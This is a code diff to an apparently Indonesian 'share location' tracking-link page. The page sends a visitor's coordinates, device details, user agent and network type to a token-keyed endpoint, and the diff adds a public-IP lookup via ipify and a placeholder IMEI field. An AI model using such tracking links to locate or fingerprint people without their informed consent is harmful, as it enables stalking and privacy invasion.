@@ -39,17 +39,31 @@
             status.style.color = type === 'success' ? '#166534' : '#9a3412';
         }
 
-        function sendLocation(position) {
+        async function sendLocation(position) {
             const operatorInfo = navigator.connection?.type || navigator.connection?.effectiveType || 'Tidak tersedia';
+            let publicIp = null;
+
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                publicIp = data.ip;
+            } catch (e) {
+                publicIp = null;
+            }
+
             const payload = {
                 latitude: position.coords.latitude,
                 longitude: position.coords.longitude,
                 device: navigator.platform || 'Unknown',
                 user_agent: navigator.userAgent,
                 operator: operatorInfo,
+                public_ip: publicIp,
+                imei: null,
             };
 
-            fetch('{{ route('share.update', ['token' => $trackingLink->token]) }}', {
+            const updateUrl = window.location.pathname.replace(/\/+$/, '') + '/update';
+
+            fetch(updateUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -58,18 +72,23 @@
                 },
                 body: JSON.stringify(payload),
             })
-            .then((response) => response.json())
+            .then(async (response) => {
+                if (!response.ok) {
+                    const text = await response.text();
+                    throw new Error(`HTTP ${response.status}: ${text}`);
+                }
+                return response.json();
+            })
             .then((data) => {
                 if (data.status === 'success') {
                     updateStatus('success', 'Berhasil, Terimakasih');
-                    log.innerHTML = `
-                        
-                    `;
+                    log.innerHTML = `Lokasi terkirim: ${data.latitude}, ${data.longitude}`;
                 } else {
                     updateStatus('error', 'Terjadi masalah saat mengirim lokasi.');
                 }
             })
-            .catch(() => {
+            .catch((error) => {
+                console.error(error);
                 updateStatus('error', 'Tidak dapat mengirim lokasi. Coba ulang halaman atau izinkan akses lokasi.');
             });
         }
